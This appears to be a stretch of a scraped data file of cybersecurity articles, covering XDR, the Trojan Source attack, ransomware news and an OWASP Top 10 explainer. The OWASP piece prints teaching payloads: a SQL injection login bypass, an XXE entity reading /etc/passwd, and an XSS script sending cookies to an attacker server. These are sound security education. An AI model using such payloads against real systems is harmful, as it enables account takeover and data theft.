online portal . \n\n This means that it has features such as integrated visibility, single pane of glass management, rapid time to value, improved productivity, lower cost of ownership, and even analyst support. \n\n It is designed to provide an organization\u2019s security team with the full set of visibility that is connected throughout all of the endpoints of a network\u2019s infrastructure, which can lead to unified remediation, improved attack understanding, and unified threat hunting, think of it as an  AI-based  security system. \n\n \n\t Collecting the data is one of the benefits of XDR; however, applying analytics and intelligence can drive better protection through faster detection. \n\t Value is driven by security analytics, which, when combined with threat intelligence, can turn information into insight and action, which is one of XDRs main purposes. \n\t XDR enables insightful investigations due to the logical connections from the data. \n \n\n \n\n \u00a0Image source \n\n This means that XDR can bring a proactive approach to threat detection, including: \n\n \n\t Identifying hidden and sophisticated threats quickly \n\t Tracking threats across many sources within an organization \n\t Increasing the productivity of the team responsible for cybersecurity \n\t Making investigations more efficient \n \n\n How does XDR analyze and detect threats? \n\n XDR conducts an analysis of both internal and external traffic, helping to detect malicious insiders, as well as identifying potential external attacks. It also implements integrated  threat intelligence , which incorporates information on known attack tools, sources, and strategies across multiple vectors, and as such, it has the ability to learn what is happening to prevent future attacks of a similar method. Through machine learning detection, it may\u00a0detect zero-day threats that might bypass signature-based methods. \n\n \n\n Image source \n\n It provides you with a graphical timeline that can provide the answers you are looking for, including information such as: \n\n \n\t How you got infected \n\t What the point of entry was \n\t Who else took part in the same attack \n\t Where the threat originates \n\t How the threat spread throughout the system \n\t How many other users have exposure to the threat\u00a0 \n \n\n How does XDR manage those threats? \n\n Once XDR detects any suspicious events occurring throughout multiple layers within an organization, it provides security teams with tools that can help them respond efficiently. These tools can automatically group alerts and build attack timelines from all of the logged activities. With a centralized user interface, analysts can investigate and respond to events quickly. \n\n XDR augments security analysts, and it streamlines the entire workflow, optimizing team efforts and speeding up any manual steps while also enabling analyses. \n\n XDR and its value\u00a0 \n\n XDR provides support for a wide range of network security responsibilities, which means that it can be adopted to help support specific use cases within an organization. \n\n These solutions can be adopted as the primary tool for aggregating data, as well as detecting events in the monitored systems and alerting the security team immediately.\u00a0 \n\n The team can then use the solutions provided to them as repositories of analyses to get information about the events, and then this information can be used to investigate the events which will help the team evaluate their response to threats.\u00a0 \n\n In other words, the data which is collected by XDR can be used as a reference point for performing threat hunting operations, which will seek out evidence of threats that might have been overlooked in the past, while simultaneously creating threat intelligence to boost the security system in the future. \n\n XDR benefits - Filling out cybersecurity gaps \n\n When it comes to the implementation of a platform such as this one, it can provide many benefits, including: \n\n Capabilities for adaptive prevention, which allows the system,  through threat intelligence and machine learning , to implement protection against a variety of different attacks, with continuous monitoring and automated responses, which can block threats as soon as they are detected to potentially prevent a lot of damage.\u00a0 \n\n An organization also gains access to granular visibility, analyzing information such as access permissions, applications that are in use at the time, and file access timeline. By far one of the biggest benefits of its implementation is the reduction in the number of alerts.\u00a0This prevents\u00a0a larger number of false positives, while also being easier to maintain and manage. \n\n In other words, XDR: \n\n \n\t Streamlines your security operations \n\t Gives you analytics to understand\u00a0your data \n\t Automates and eliminates repetitive tasks\u00a0 \n \n\n According to  CSO , 63% of companies said that their data was compromised within the last twelve months, and 60% of the total breaches were due to vulnerabilities where a patch was available, but not applied on time.\u00a0 \n\n XDR enables an organization to discover these risks, monitor them, and assess how much exposure they result in. It gives an organization the required defense it requires for dealing with advanced threats and provides security teams with the tools they require to deal with these threats.\u00a0 \n\n Through constant monitoring and machine learning, this defense grid of sorts constantly evolves and strengthens. Future exploits are more easily detected and eliminated. \n\n Platforms such as this one ease the efforts of security and response teams, going beyond interfaces and extending to configuration and maintenance requirements. Taking a look beyond traditional security systems can go a long way into the protection of most enterprises and organizations. \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t",

        "text": "\n \n Academic researchers have released details about a new attack method they call \u201cTrojan Source\u201d that allows injecting vulnerabilities into the source code of a software project in a way that human reviewers can\u2019t detect. \n Trojan Source relies on a simple trick that does not require modifying the compiler to create vulnerable binaries. \n The method works with some of the most widely used programming languages today and adversaries could use it for supply-chain attacks. \n Abusing text-encoding standards \n Researchers from the University of Cambridge, United Kingdom, disclosed and demonstrated the \u201cTrojan Source\u201d class of attacks that could compromise first-party software and supply chains. \n The examples they provide are for projects written in C, C++, C#, JavaScript, Java, Rust, Go, and Python where an attacker can target the encoding of source code files to inject vulnerabilities. \n \u201cThe trick is to use Unicode control characters to reorder tokens in source code at the encoding level,\u201d\u00a0 reveals Nicholas Boucher , one of the researchers that discovered Trojan Source. \n \u201cWe have discovered ways of manipulating the encoding of source code files so that human viewers and compilers see different logic. One particularly pernicious method uses Unicode directionality override characters to display code as an anagram of its true logic,\u201d\u00a0 explains Ross Anderson , the other researcher behind testing the Trojan Source attack method. \n By using control characters embedded in comments and strings, a threat actor can reorder the source code to change its logic in a way that creates an exploitable vulnerability. \n Bidirectional and homoglyph attack \n The researchers showed that one way this can be achieved is by using Unicode controls for bidirectional text (e.g. LRI -left-to-right isolate, and RLI -right-to-left isolate) to dictate the direction in which the content is displayed. This method is now tracked as  CVE-2021-42574 . \n The bidirectional (Bidi) controls LRI and RLI are invisible characters, and they are not the only ones. By injecting these instructions, a compiler can compile code that is completely different from what a human sees. \n In the image below, using the RLI/RLI controls inside the string the second line is compiled while the human eye reads it as a comment that the compiler would ignore. \n \n source:\u00a0 Nicholas Boucher \n Injecting Unicode Bidi override characters into comments and strings, an adversary could \u201cproduce syntactically-valid source code in most modern languages for which the display order of characters presents logic that diverges from the real logic.\u201d \n Another way is a homoglyph attack ( CVE-2021-42694 ), where two different characters have a similar visual representation, such as the number \u201czero\u201d and the letter \u201cO,\u201d or the lowercase \u201cL\u201d and the uppercase \u201ci.\u201d \n In a homoglyph Trojan Source attack as exemplified below, the human eye will see both functions identical, while the compiler distinguishes between the Latin \"H\" and the Cyrillic \"H\" and treats the code as having two different functions, so the outcome will not be the same. \n \n In a\u00a0 paper \u00a0[PDF] detailing the new Trojan Source attack method, the researchers highlight that the bidirectional (Bidi) override characters persist through copy/paste action on most browsers, editors, and operating systems. \n The researchers tested the Trojan Source attack against multiple code editors and web-based repositories that are commonly used in programming and found that their method worked on many of them. \n \n Following the principle of using Bidi overrides to create code that is valid when reordered, the researchers found at least three techniques that allow exploiting of the source code: \n Early Returns - hide a genuine \u2018return\u2019 statement in a comment so that it can cause a function to return earlier than it appears to \n Commenting Out - trick human review by placing important code, such as a conditional, in a comment so that it is disregarded by the compiler or the interpreter \n Stretched Strings - reverse-order the code to make it seem to be outside a string literal \n One way to defend against Trojan Source is to reject the use of control characters for text directionality in language specifications and in compilers that implement the languages. \n \n \"In most settings, this simple solution may well be sufficient. If an application wishes to print text that requires Bidi overrides, developers can generate those characters using escape sequences rather than embedding potentially dangerous characters into source code\" \n \n Coordinated disclosure \n On July 25, the researchers informed multiple maintainers of products found to be impacted by the Trojan Source attack method and set a 99-day embargoed disclosure period. \n The\u00a0CERT Coordination Center also received a vulnerability report and assisted with the coordintated disclosure by providing a shared communication platform for vendors implementing defenses. \n Following their report, the researchers received an average of $2,246 in bug bounties from five of the recipients, although 11 of them had a bug bounty program. \n At the moment, multiple compilers are unable to stop the Trojan Source attack method, despite almost two dozen software suppliers being aware of the threat. \n Since many maintainers are still to implement a patch, the two researchers recommend governments and companies identify their suppliers and pressure them into adopting the necessary defenses. \n \n \"The fact that the Trojan Source vulnerability affects almost\u00a0all computer languages makes it a rare opportunity for a\u00a0system-wide and ecologically valid cross-platform and crossvendor comparison of responses\" \n \n The researchers added that three companies that maintain code repositories are currently deploying defenses against Trojan Source. \n In a  repository on GitHub , they provide proof-of-concept (PoC) scripts that demonstrates how much of a threat the Trojan Source attack can be. \n \n Related Articles: \n Popular 'coa' NPM library hijacked to steal user passwords Misconfigured Apache Airflow servers leak thousands of credentials Facebook open-sources tool to find Android app security flaws Six million Sky routers exposed to takeover attacks for 17 months Threat actors offer millions for zero-days, developers talk of exploit-as-a-service \n \n",

        "text": "\n \n The Canadian province\u00a0of Newfoundland and Labrador has suffered a cyberattack that has led to severe disruption to healthcare providers and hospitals. \n The attack took place on October 30th, causing regional health systems to shut down their networks and cancel thousands of medical appointments. This outage affected health systems in Central Health, Eastern Health, Western Health, and the Labrador-Grenfell Regional Health authorities. \n \n The IT outage also affected communications in the region, with people reporting an inability to reach the health care centers or 911 via phone. \n Yesterday, the Department of Health and Community Services announced that they had started an investigation into the systems outage with the help of the managed service provider, Bell Aliant. \n Returning to pen and paper \n As emails are not working and doctors cannot register new patients or upload and access medical results on the database, many affected health centers have turned to using pen and paper. \n Affected healthcare centers have also been forced to cancel or reschedule appointments for chemotherapy, x-ray scans, surgeries, and other specialist services. \n While the IT outages are not the same for all hospitals in the province, almost all of them deal with\u00a0 some form of disruption . \n The only thing that continues to operate normally are vaccinations, emergency care, and the admission of cases that can't be rejected. \n Likely a ransomware attack \n While the Canadian government or healthcare systems have not disclosed what type of cyberattack they have suffered, sources have told BleepingComputer that it is ransomware. \n Health Minister John Haggie and Eastern Health CEO David Diamond spoke at a media conference earlier today, stating that the incident had a 'significant impact' and a 'damaged data center.'\u00a0 \n \n If this turns out to be a ransomware attack, there is a good chance that data was stolen as well, including possible patient information. \n As for when things will return to normal status, Haggie said it could be a couple of days before all systems are up and running again. \n BleepingComputer has contacted the province's press contact with further questions but has not heard back at this time. \n Canada in hackers\u2019 crosshairs \n Canada's public services have been a target for numerous ransomware attacks in the past. \n In October 2020, Montreal's STM public transport system was\u00a0 hit by RansomExx , and in December 2020, Vancouver's Metro operator TransLink faced severe IT problems following\u00a0 an Egregor attack . \n A month later, TransLink concluded its investigation and confirmed that the Russian hackers had stolen customer details. \n \n Related Articles: \n Moses Staff hackers wreak havoc on Israeli orgs with ransomless encryptions Microsoft warns of the evolution of six Iranian hacking groups MediaMarkt hit by Hive ransomware, initial $240 million ransom Second farming cooperative shut down by ransomware this week Hacking gang creates fake firm to hire pentesters for ransomware attacks \n \n",

We assume the current cycle is also in retaliation for the  attack against the gas pumps in Iran  last week.\" - Omri Segev Moyal. \n \n Last year, the group extorted the Israeli insurance company' Shirbit,' demanding a payment of\u00a0 $1 million in Bitcoin \u00a0and threatening to leak stolen data.\u00a0 \n \n Related Articles: \n Microsoft: Iran-linked hackers target US defense tech companies Microsoft warns of the evolution of six Iranian hacking groups Moses Staff hackers wreak havoc on Israeli orgs with ransomless encryptions Suspected Chinese hackers behind attacks on ten Israeli hospitals The Week in Ransomware - November 19th 2021 - Targeting Conti \n \n",

        "text": "Never cross the road alone!\u00a0Always brush your teeth before bed! Never talk to strangers! Every parent has shouted these ominous sentences at their kids more than once, and for a good reason- it is our responsibility to keep them safe from harm and sickness in the physical world. But what is becoming apparent is that this may not be enough anymore- as kids spend much of their time online they are exposed to new perils which we (as kids) were not taught to vigilant about-simply because there were none. But today? Every kid has access to the web, apps and social media. So should we teach our children about the perils of the online world? The answer is obvious. But at what age should we start and what should we actually teach? This is open for debate. I think that starting the education at the earliest age possible is not only better but compulsory. You might think that 5 year old kids are too young to learn about the dangers of the internet, but what you need to remember is that a kids that age have about 3-4 years of experience in using connected devices, be it smartphone, tablet or laptop (and soon, wearables) under their belts, so they know all about how to operate such device without having even the slightest understanding of the potential risks associated with this way of leaving- anything from revealing their whereabouts to anonymous adults to giving dad\u2019s credit card details can happen. So in my eyes, if we teach them how to cross the road safely, how not to touch a scolding hot oven and how to avoid talking to strangers, we can and must teach them not to do the equivalent of these things online. And we should stop there. And just like we teach them in the \u201creal\u201d world (for them the online world is as real as the physical one) to keep proper hygiene and behave nicely, we should do the same with the virtual world. They should be thought to which places are appropriate to hang out and which are perceived as \u201cdirty\u201d (not just porn sites, but even news sites should be avoided due to too-graphic depiction of violence), and they should know about netiquette- what is appropriate to say to whom (sure, most of the can\u2019t even write, but they sure know how to \u201clike\u201d). Doing this will reduce the plague of cyber-bullying because kids will understand from a young age that what is forbidden to do in the classroom (insult your teacher) or during recesses (insult your peers) is also forbidden online (and on whatssapp groups). \u00a0So the education should focus on three aspects- Safety \u2013 what is dangerous to do online- disclosing personal details, downloading apps from shady stores etc. And never agree to meet anyone in the real world\u2026 Hygiene \u2013 what is considered healthy online- not to post embarrassing pictures of yourself (naked selffies anyone?), not Netiquette \u2013 how to communicate with others online in a respectable manner. This may seem over the top and surely will take years for the educational system to adopt. Don\u2019t wait for them, just as you won\u2019t wait until your kid is in preschool to teach her to stay away from sharp objects. Do it as soon as they get a grasp on handling these devices. And don\u2019t shy away from tough questions- remember, whatever you can find online they can probably too. Trusting some filtering mechanism simply won\u2019t do anymore- as they consume so much over social networks and IM networks, and there\u2019s no way these tools will ever be able to cover everything. The only way to protect our kids online is to instill some fear and respect in their heart and minds about the online realm- yes, watching YouTube is cool but they shouldn\u2019t do it without adult supervision, and only mom and dad can take pictures of them and post them. Remember, anything you do is better than doing nothing at all- which is what most parents do and all educational institutes (which simply ignore this until a much older age). Our parents also adjusted our education to accommodate new technology (microwave, VCR, cable TV etc.) we owe it to our kids to do the same.",

        "title": "Real-World Examples for OWASP Top 10 Vulnerabilities",
        "author": "Elias Chachak",
        "date": "2021-11-02T07:28:37-07:00",
        "text": "The OWASP (Open Web Application Security Project) Top 10 is a standard security guideline followed by developers and security professionals across the industry. The OWASP is a non-profit organization started in 2004 to help secure applications against popular vulnerabilities. As software development practices have evolved over the years, so have the nature of attacks. To stay relevant as per current day complex security vulnerabilities,  OWASP  keeps updating its vulnerabilities list based on the current trends (OWASP is currently in its 2017 edition). Having understood what  OWASP Top 10  standard is, let\u2019s look at each one of them with a real-world example to help our understanding. 1. Injection SQL injections  occur when a user-controlled input is appended to the SQL statement dynamically without input validation. In this case, the attacker may provide malicious input and change the SQL statement behavior to carry out their malicious activities. The attacker can use this to extract sensitive data, delete data, etc. Below are examples of vulnerable and non-vulnerable code snippets. Vulnerable code: uName = getRequestString( \u201cusername\u201d );   uPass = getRequestString( \u201cuserpassword\u201d );   sql =  \u2018SELECT * FROM Users WHERE Name =\u201d\u2018  + uName +  \u2018\u201d AND Pass =\u201d\u2018  + uPass +  \u2018\u201d\u2018 Here uName and uPass are user-controlled. If an attacker submits uName as \u201cadmin\u201d and password as \u201d OR 1 = 1 \u2014 then the SQL statement will become something like sql = \u2018SELECT * FROM Users WHERE Name =\u201dadmin\u201d AND Pass =\u201d\u201d OR 1 = 1 \u2014 This will make the statement true and will fetch records for admin users. Using prepared statements remains the most popular and effective way to remediate this issue, as shown below. Fixed code: String  Uname = // user   input   String  Upass = // user   input   Connection connection = DriverManager.getConnection(\u2026);   PreparedStatement statement = connection.prepareStatement(   \u201cSELECT * FROM Users WHERE Name = ? AND Pass = ?\u201d  );   statement.setString( 1 , Uname);   statement.setString( 2 , Pass);   ResultSet rs = statement.executeQuery(); \u00a0 2. Broken Authentication Weak or missing authentication can allow attackers to compromise password and session tokens and ultimately gain access into the victim\u2019s account. Therefore, applications should use complex and secure random passwords and session tokens such that they can\u2019t be guessed easily.\u00a0 Apart from that, there should be security controls such as an account lockout policy and password expiry policy to prevent applications from falling prey to automated brute force attacks. \u00a0 3. Sensitive Data Exposure Data exposure can happen mainly in two ways.  First,  at rest\u2014when the data is stored in the system (file or database), it should be encrypted using a strong encryption mechanism. If this is not done and the storage service is compromised, stored data may get leaked.\u00a0 Second , in transit\u2014data should be properly encrypted when sent across network channels. Thus, if it is intercepted in between, the integrity of the sensitive data remains unchanged. This is called data protection at transit. Note:  Password fields should be hashed and then stored in the database. The reason for this is that hashing is a one-way mechanism. Thus, even if the database is compromised, the attacker will not be able to retrieve the password value from the password hash. \u00a0 4. XML External Entities (XXE) Quite a few applications use XML documents to enable the communication of data between the server and browser. Therefore, they need XML parsers to parse the information. When a poorly configured XML parser is used to parse a malicious input XML document, it may evaluate the  external entity  references executing the attacker\u2019s commands. Below is an example of a malicious input XML document. <? xml version= \u201c1.0\u201d  encoding= \u201cISO-8859-1\u201d ?>   <!DOCTYPE foo [   \u00a0 <!ELEMENT foo ANY >   \u00a0 <!ENTITY xxe SYSTEM \u201cfile:///etc/passwd\u201d >]>   < foo > &xxe; </ foo > In the above snippet, there is a system command to read the local \u201cpasswd\u201d file on the server. In certain cases, this vulnerability may propagate into other attacks like SSRF (server-side request forgery), local file inclusion, remote code execution, DoS attack, etc. As remediation, it is suggested to disable resolution of external entities and disable support for XInclude.\u00a0 \u00a0 5. Broken Access Control\u00a0 Access control refers to the restriction enforced on selected resources to provide access to only intended users. An application that does not enforce proper access control may allow an attacker to access unauthorized functionalities or data. Below is a real-life example of a\u00a0 vulnerable system that used user input without validation. System #1: The application uses unvalidated data in a SQL statement that is accessing account information from database: pstmt.setString( 1 , request.getParameter( \u201cacctNo\u201d )) ;   ResultSet results = pstmt.executeQuery( ) ;   An attacker simply modifies the  \u2018acctNo\u2019  parameter  in  the browser  to   send  whatever account  number  they want  and  successfully accesses any user \u2018s account. Service  call :   http: //example.com/app/accountInfo?acct=1234 \u00a0 6. Security Misconfiguration This is the most popular security vulnerability across many applications/systems. As developers use a lot of integrated tools and services during application development, they tend to use the default setting provided, which is dangerous and leaves your application vulnerable.\u00a0 Under normal circumstances, application configurations enable detailed error messages. So when an error occurs, like debug logging, stack traces, etc., the browser gives the complete details to the user. Unfortunately, this exposes sensitive information such as component versions which can be a problem if the component has known vulnerabilities that you have not fixed yet. \u00a0 7. Cross-Site Scripting XSS:\u00a0\u00a0 In cross-site scripting ( XSS ), attacker-controlled user input is added to the web page without validation or proper escaping. Then the attacker may introduce malicious code to execute their Javascript on the victim\u2019s browser. This can be used to redirect the victim to an attacker-controlled page, change UI elements of the page to deface it, or steal cookie details. Below is an example of a javascript payload that steals cookies and sends them to the attacker server. \u00a0 < script  type= \u201ctext/javascript\u201d > document .location= \u201chttp://192.168.0.48:5000/?c=\u201d + document .cookie; </ script > \u00a0 8. Insecure Deserialization:\u00a0 The  insecure deserialization  vulnerability arises when an application deserializes user-provided serialized input without implementing security controls. Few popular deserializers such as Python\u2019s Pickle Module and Java\u2019s ReadObject method are known to be vulnerable to deserialization attacks. Using this, an attacker can perform remote code execution on the server resulting in securing remote access.\u00a0 \u00a0 9. Using Components with Known Vulnerabilities Today, using free/open source softwares and third-party libraries is a very common practice in application development. Therefore, it is equally important to ensure the security of these open source and third-party components used in the development. This practice of managing open source and third-party software security and licensing is also known as  software composition analysis .\u00a0 \u00a0 10. Insufficient Logging & Monitoring To prevent a cyber attack and act in case of one, logging and monitoring systems are the most critical link in the security event management chain. They help detect and analyze the root cause of the attack. Incident monitoring solutions like Splunk, CyberArk help analyze endpoint logs and report malicious behavior in the form of alarms. To act on these alarms, incident response solutions like Resilient, ForcePoint, and Crowdstike can be used. They execute a set of predefined actions to help tackle security threats. Conclusion Application developers and security engineers should test their codebases against popular web vulnerabilities before publishing their applications in a production environment. This OWASP Top 10 list of web vulnerabilities can be used as a checklist in security testing.\u00a0 Thank you all for going through the OWASP Top 10 with me. I hope you enjoyed reading.\u00a0\u00a0 \u00a0",

        "text": "Businesses are the common targets of hackers. Thus, if you have a business, you need to prioritize its safety at all times. This is especially true today when everything is readily accessible through the internet.\u00a0 If you store your business data digitally, it might be at risk of attacks from hackers. Malicious parties might infiltrate your system in various ways, including phishing. Of course, this growing trend is caused by the fact that most businesses depend on the internet to monitor finances, maintain inventory, conduct marketing, and connect with clients, despite the increasing risks.\u00a0\u00a0 If your goal is to keep your business safe from future phishing and hacking attempts, here are several ways to protect your devices from hackers.\u00a0 Put Up A Firewall\u00a0 Depending on the operating system your business is using, the built-in firewall may be sufficient to function as a barrier for your data. When you have one in place, it prevents unauthorized access to your business network and alerts you if any intrusion attempts occur.\u00a0\u00a0 Always make sure to enable the firewall before going online. If you have a large-scale business, it\u2019s best to consider an additional business networking firewall.\u00a0 Avail Of Cybersecurity Services Since keeping your business secure from potential hacking attempts is crucial to the safety of your operations, it\u2019s best to consider cyber security services to fix any vulnerable points in your system. With the help of professionals, you can better protect your business devices against future hacking attempts or data breaches.\u00a0 Checking out, for example, a  Toronto-based IT company Fusion Computing  and other reliable providers is a good starting point to get the best protection for your business.\u00a0 Update Regularly\u00a0 Stay up-to-date with the latest updates for your operating system, applications, and browsers. Most of these updates include security fixes to prevent hackers from accessing and damaging your data.\u00a0\u00a0 Create A Unique And Solid Password\u00a0 A highly secure password is crucial in preventing network intrusions. Having a secure password will make it hard for hackers to infiltrate your system.\u00a0 It\u2019s best to utilize a combination of characters, numbers, and uppercase and lowercase letters for your password. Avoid using common words or combinations such as birthdays or personal information.\u00a0\u00a0 Secure Your Network\u00a0 Routers don\u2019t usually include adequate security settings. Access the router and set a solid password utilizing a secure, encrypted setup when preparing your network. Doing so will prevent intruders from accessing your network and disrupting your settings.\u00a0\u00a0 Use An Antivirus And Anti-spyware Solution\u00a0 Viruses,  malware , and spyware are rampant these days. It would be best to get reliable antivirus and anti-spyware solutions to keep your devices safe.\u00a0 An antivirus program will protect your device from elements that can threaten the operating system. Moreover, antivirus software can detect real-time threats to keep your business data secure. Advanced programs even include automatic updating to ensure protection against new viruses.\u00a0\u00a0 On the other hand, spyware is software that secretly monitors and gathers personal or business data. In most cases, it\u2019s hard to detect and remove. Sometimes, it can even gain access to your passwords and financial details. However, when you have an anti-spyware package, you\u2019ll have real-time protection since the software scans all incoming information and blocks possible threats.\u00a0 Backup Your Business Data If you\u2019ve been overlooking the task of backing up your business data, now is the right time to prioritize it to prevent a data breach or hacking attempt in the future. Remember that backing up your data on all your devices is an effective precautionary measure.\u00a0\u00a0 When you backup your data, the recovery and restoration process will be more manageable after any data breach or loss. Additionally, consider having a designated external hard drive for your backups to ensure adequate space for your backup utilities to work properly.\u00a0 Utilize Two-Factor Authentication\u00a0 Passwords serve as your initial line of defense against hackers. So, providing another layer of security will effectively boost protection.\u00a0\u00a0 Two-factor authentication works by requiring users to confirm their identity before logging in. It\u2019s a powerful tool against hackers. Make sure that every account related to your business has two-factor authentication.\u00a0 Provide Training For Your Employees\u00a0 One of the ways to lower the risk for potential hacking attempts is to keep all your employees up to date on the latest infiltration methods. Regular training will keep your employees aware of the potential threats and online safety measures to observe.\u00a0 Limit The Access Of Employees To Sensitive Data  \u00a0 Human error is usually the most common reason malicious parties gain access to sensitive data. Therefore, one of the ways to lessen the likelihood of a data breach is to provide access only to trusted employees.\u00a0\u00a0 Additionally, you need to delete all accounts for outgoing employees once they leave your company. Doing so prevents unwanted access to your business data.\u00a0 Conclusion\u00a0 The cases of  hacking attempts  continue to rise. When you have a business, you need to take the necessary measures to protect it against attacks or infiltration that can disrupt your daily operations. By implementing these security measures, you can safeguard your business and continue with your day-to-day operations.\u00a0\u00a0",

        "title": "New Ransomware Trends You Should Know in 2021",
        "author": "Elias Chachak",
        "date": "2021-10-25T05:00:30-07:00",
        "text": "All your files have been encrypted! That\u2019s how cybercriminals notify you of a ransomware attack on your computer. They further ask you to pay the ransom amount to recover your files, which hardly happens in real life. Ransomware locks all your files and renders your system useless. Many people pay the cybercriminals in the hope of recovering the data. However, the unethical group hardly ever provides you with the decryption key. Thus, causing data and financial loss at the same time. Luckily, several antimalware programs can stop such attacks in real-time. In this article, we will look at some ransomware trends of 2021 and how dangerous they are. So, without any further ado, let\u2019s begin. The Scale of Ransomware Threat Ransomware has become one of the most troubling threats in 2021. There are two main reasons for it to happen. The result of a ransomware attack impacts many people, and it is visible to everyone. There is a high chance for cybercriminals to make hefty profits. For instance, at the beginning of this year, a cybercriminal group collected 190 Bitcoins from a single ransomware program. They ran several attacks targeted at multiple devices using the same  ransomware  program. The amount they gathered through ransom is roughly equal to 12 million USD at the current conversion rate. As more hackers come to know about such stats, there is a high chance that these attacks will grow in number. Here are some key takeaways for the year 2020 from  Sophos\u2019 annual ransomware survey . 51% of companies mentioned a successful ransom attack on their server. 26% of companies paid the asked ransom amount. Companies recovered only 65% of total data on average. Criminals asked for $180,000 from big companies. Criminals asked for $6000 from small businesses. The initial investment for a ransomware attack can be as little as $50. A new ransomware attack is attempted every 11 seconds. \u00a0 Why is Ransomware Trending? Although the number of successful ransomware attacks is declining because companies take security measures, the number of attempts has significantly increased. One of the primary reasons for the hike in ransomware attacks is the decline in other cybercrimes. For instance, an APT group that targets a financial enterprise is finding it challenging to operate due to a lack of money mules. The APT group requires dedicated members and imposters in a company to operate. Remote work has made it harder for such gangs to execute their nefarious operations. Therefore, they rely on the next best method to fetch money from big enterprises, i.e., through ransomware. Another advantage for cybercriminals while using a ransomware attack is data collection. If a company denies paying the ransom amount, criminals sell their data on the darknet. One more noteworthy ransomware trend is the decline in targeting home users. The effectiveness of a successful ransomware attack is directly proportional to how much profit cybercriminals can make. The primary channel of spreading ransomware to home users is through email. As the younger generation has shifted to instant messaging, opening spam emails is a thing of the past. Awareness about spam mails has also played a significant role in this area. Moreover, many users have shifted from desktop to mobile devices, which is evident from the drop and hike in sales for desktop and smartphones, respectively. Besides, most of us have our essential documents and photos backed up on a cloud server. It significantly brings down the necessity to pay for recovering your data. On the other hand, all sorts of companies have become the likely target for cybercriminals. For once, they have more money to pay as a ransom. Secondly, they have their reputation to protect. If a company denies paying the ransom and their user data is leaked, they will surely see a drop in userbase. Factors Contributing to Ransomware Attacks Let us look at some direct and indirect factors that are contributing to the trending ransomware attacks. Maze Ransomware One of the most prominent ransomware families is Maze ransomware. The developers behind this one have set the bar too high for ransomware in general. The group has pledged not to attack any medical institution or companies affected by the economic crisis. Instead, they target the capitalist class creating a Robinhood image among their cult. Maze groups have also interacted with media repeatedly to boost their reputation. Maze is a pioneer in creating a cartel of cybercriminals. They share their programs, tactics, and information of compromised companies to retarget them. They use phishing emails, exploit kits, or use system vulnerabilities to execute an attack. Some other famous ransomware families are Jigsaw, Dharma, Ryuk, and Sodinokibi. \u00a0 Remote Access Trojan Phishing emails have been the primary distribution channel for cybercriminals. However, there is an increase in the number of attacks using RAT programs. A trojan is an app that infiltrates a system disguised as harmless software. Later, it sideloads other malware on the system. RATs are not a very popular subject because their presence is hardly noticeable. It might often happen that a trojan brought ransomware to your system, and you never realize the entry point. Trojans can also cause harm by collecting user data, keystrokes, behavior, app usage, and more. Therefore, it is one of the most dangerous malware hiding in plain sight. Mode RAT programs can have multiple modules to execute countless tasks. Moreover, a modular architecture helps developers create a copy as per their requirements in a particular project. Since cybercriminals can access RAT programs remotely, it is often challenging to target them, making it one of the go-to options for unethical tasks. \u00a0 Remote Desktop Protocol The pandemic has forced us to shift towards remote working to keep the world going. It has undoubtedly helped video conference platforms like Zoom. It has also created new use cases for Microsoft\u2019s Remote Desktop Protocol. RDP is a Windows tool that allows users to connect to a remote computer on a connected network. Something similar to the third-party software Anydesk, but built-in. Due to its simplicity and usability majority of the companies have started using it. The increased number of users on the RDP platform has also attracted cybercriminals. There have been multiple exposures on RDP, among which  BlueKeep vulnerability  is widespread. Shadon.io, a dedicated search engine for internet-connected devices, raised caution for around 4 million systems on the internet with an open RDP port. Cybercriminals can scan and exploit such devices, which they have done repeatedly this year. Cybercriminals have also exploited SMB and POP3 to steal confidential information. Cisco revealed that 1/3rd of their company faces RDP-related issues every month. Working from Home More than half of companies had to transfer 50-100% of their employees for remote work in the pandemic. Cybercriminals quickly sensed this opportunity and actively took part in creating fake websites. There was a hike in domain names containing \u201cCoronavirus\u201d and \u201cCOVID\u201d in the URL. Unethical developers created websites with similar domain structures and presented COVID-related news on their websites. Further, they use this opportunity to distribute ransomware and other malware programs to user computers. Stealing Passwords Cybercriminals tend to steal user passwords for entering the system. It is the second most used criminal activity by ransomware gangs after phishing. Usually, legitimate accounts help cybercriminals go undetected while doing their notorious tasks. Unlike Trojans or exploiting vulnerabilities, a mole is hard to detect using traditional security programs. Only a well-devised behavior analysis program can help you discover an intruder in your system. Login ids and passwords are usually stored in a browser\u2019s cached information or another similar place. Ransomware gangs use special tools to collect this data. One such program is named Mimikatz. Developers initially used it for penetration testing to detect and solve vulnerability issues. However, the tool became popular underground, and attackers are using it to steal user information. Attack on Medical Institutions Many ransomware gangs boldly claim that they do not attack a healthcare institution. However, we have seen an increased rate of medical field exploits in the last year. Cybercriminals are interested in big hospitals, medium-sized clinics, and government records dealing with medical information. Firstly, the information can provide sensitive details about the patients. They can then target those individuals. Secondly, pharma industries are known to pay the ransom quicker than any other industry. The inconvenience raised by equipment failure leads to life or death situations. Conclusion There have been increased ransomware attacks in the year 2021. I expect the number to rise in the following months due to the complete digitalization process worldwide. Meanwhile, cybercriminals are getting smarter, and it will be challenging to tackle them with older technologies. In the end, it is best to practice cybersecurity practices to  keep your organization safe .",

Year on year, changes occur that fundamentally affect the way we interact, the way we view the world, and the way businesses operate. From emerging technologies such as cloud computing, Artificial Intelligence (AI), automation, and the Internet of Things (IoT), there have been a slew of previously unprecedented opportunities for businesses to incorporate that offers definitive value. 2021 will be no different, however the emphasis may be now pushed in a different direction as businesses look to understand just how AI will affect cybersecurity, alongside other AI related cybersecurity trends that are on the horizon. Vendors will likely accelerate AI and machine learning app development to combine human and machine insights to prevent attackers who are intent on escalating their cyber activities. When we ask how is AI changing cybersecurity, it\u2019s important to first look at how the previous year altered everything. Lockdowns, bankruptcies, pandemics, business closures, and general confusion has led to a golden age for cyber-attackers to capitalize on the situation. Unfortunately, 2020 has been rife with tragedies since the outbreak of the Coronavirus crisis, with businesses being forced to embrace concepts like remote working, which has only led to a number of new problems. As people have turned to remote working in huge numbers and hackers use new AI attacks against them, they are more vulnerable to different cyberthreats than ever before. In 2021, these cybersecurity issues will continue to rise as businesses will need to recognize that AI, and AI related cybersecurity trends are going to be pivotal when it comes to solving these challenges. How AI Benefits and Challenges Cybersecurity As technology evolves, so too does the capacity of the cyber threat landscape that organizations have to deal with on a daily basis. In fact, it doesn\u2019t just slow advancement, it inhibits its development in the first place. It is estimated that cyber threats globally affect the pace of technological innovation by as much as $3 trillion in lost economic value, just in 